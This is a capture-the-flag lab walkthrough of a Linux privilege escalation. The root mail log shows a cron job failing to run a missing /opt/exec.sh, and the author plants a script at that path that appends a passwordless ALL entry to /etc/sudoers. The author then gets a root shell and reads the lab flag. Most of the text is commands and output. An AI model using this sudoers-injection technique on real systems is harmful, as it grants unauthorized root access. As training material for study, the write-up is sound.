# Logs that reveal attempt to run non existent program

A running Linux server is a complicated beast with dozens of things happening in the background. Admins might at times forget to clean up the system properly when they install/update/remove things. Most of the times, these scenarios can be debugged with error logs. For an attacker, these logs can be a treasure trove! It allows him to understand how everything is running in the server and what kind of errors are happening. Of course, these logs might sometimes be spread over the system in different formats based on the admin's personal preferences.

Check runing processes

```
student@attackdefense:~$ ps -ef
UID          PID    PPID  C STIME TTY          TIME CMD
student        1       0  0 07:06 ?        00:00:00 /bin/bash /startup.sh bash
root          12       1  0 07:06 ?        00:00:00 /usr/sbin/cron
root         124       1  0 07:06 ?        00:00:00 /usr/lib/postfix/sbin/master
student      125       1  0 07:06 ?        00:00:00 /usr/local/bin/ttyd -p 8000 bash
postfix      126     124  0 07:06 ?        00:00:00 pickup -l -t unix -u -c
postfix      127     124  0 07:06 ?        00:00:00 qmgr -l -t unix -u
postfix      133     124  0 07:07 ?        00:00:00 cleanup -z -t unix -u -c
postfix      134     124  0 07:07 ?        00:00:00 trivial-rewrite -n rewrite -t unix -u -c
postfix      135     124  0 07:07 ?        00:00:00 local -t unix
student      137     125  0 07:07 pts/0    00:00:00 bash
student      145     137  0 07:08 pts/0    00:00:00 ps -ef
```

`postfix/sbin/master` - mailing service is running as root

Check mail log

```
student@attackdefense:~$ tail -20 /var/mail/root
Return-Path: <root@c236e95ceed7>
X-Original-To: root
Delivered-To: root@c236e95ceed7
Received: by c236e95ceed7 (Postfix, from userid 0)
        id 367781AE89F; Sat, 10 Jul 2021 07:10:01 +0000 (UTC)
From: root@c236e95ceed7 (Cron Daemon)
To: root@c236e95ceed7
Subject: Cron <root@attackdefense> /bin/sh /opt/exec.sh
MIME-Version: 1.0
Content-Type: text/plain; charset=US-ASCII
Content-Transfer-Encoding: 8bit
X-Cron-Env: <SHELL=/bin/sh>
X-Cron-Env: <HOME=/root>
X-Cron-Env: <PATH=/usr/bin:/bin>
X-Cron-Env: <LOGNAME=root>
Message-Id: <20210710071001.367781AE89F@c236e95ceed7>
Date: Sat, 10 Jul 2021 07:10:01 +0000 (UTC)

/bin/sh: 0: Can't open /opt/exec.sh
```

Recent error shows trying to access /opt/exec.sh

The program does not exist

```
student@attackdefense:~$ ls -la /opt/exec.sh
ls: cannot access '/opt/exec.sh': No such file or directory
```

We can create a new file with the same name in the same location to get this mail process to run it

The program adds to the sudoer file for student user to ru anything without a password

```
student@attackdefense:~$ printf '#!/bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /opt/exec.sh
student@attackdefense:~$ cat /opt/exec.sh
#!/bin/bash
echo "student ALL=NOPASSWD:ALL" >> /etc/sudoers
```

We now see this line added to the sudoers file

```
student@attackdefense:~$ sudo -l
Matching Defaults entries for student on attackdefense:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User student may run the following commands on attackdefense:
    (root) NOPASSWD: /etc/init.d/cron
    (root) NOPASSWD: /etc/init.d/postfix
    (root) NOPASSWD: ALL
```

We can now run any program as root such as /bin/bash

```
student@attackdefense:~$ sudo /bin/bash
root@attackdefense:~# id
uid=0(root) gid=0(root) groups=0(root)
root@attackdefense:~# cat /root/flag
dfba711fd731b0c2ebc1586b0484a8ec
```
